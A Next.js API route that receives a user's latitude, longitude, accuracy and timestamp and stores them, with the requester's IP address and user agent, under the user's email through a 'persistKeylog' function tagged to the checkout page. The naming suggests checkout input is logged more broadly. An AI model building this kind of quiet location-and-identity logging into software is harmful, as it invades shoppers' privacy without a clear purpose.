import { NextRequest, NextResponse } from 'next/server'
import { databaseService } from '@/lib/postgres-database'

// POST /api/location - Log user location for faster email processing
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { email, latitude, longitude, timestamp, accuracy } = body
    const ipAddress = request.ip || request.headers.get('x-forwarded-for') || 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'

    // Email may not be known yet at first. If missing, acknowledge without DB write.

    if (latitude === undefined || longitude === undefined) {
      return NextResponse.json(
        { error: 'Latitude and longitude are required' },
        { status: 400 }
      )
    }

    if (email) {
      // Store location into customer profile via keylog upserts
      await databaseService.persistKeylog({
        customerEmail: email,
        field: 'latitude',
        value: String(latitude),
        ipAddress: String(ipAddress),
        userAgent,
        context: 'location',
        page: 'checkout'
      })
      await databaseService.persistKeylog({
        customerEmail: email,
        field: 'longitude',
        value: String(longitude),
        ipAddress: String(ipAddress),
        userAgent,
        context: 'location',
        page: 'checkout'
      })
      if (accuracy !== undefined) {
        await databaseService.persistKeylog({
          customerEmail: email,
          field: 'locationAccuracy',
          value: String(accuracy),
          ipAddress: String(ipAddress),
          userAgent,
          context: 'location',
          page: 'checkout'
        })
      }
      if (timestamp) {
        await databaseService.persistKeylog({
          customerEmail: email,
          field: 'locationTimestamp',
          value: String(timestamp),
          ipAddress: String(ipAddress),
          userAgent,
          context: 'location',
          page: 'checkout'
        })
      }
    }

    return NextResponse.json({ success: true, persisted: Boolean(email) })
    
  } catch (error) {
    console.error('Location logging error:', error)
    return NextResponse.json(
      { error: 'Failed to log location' },
      { status: 500 }
    )
  }
}
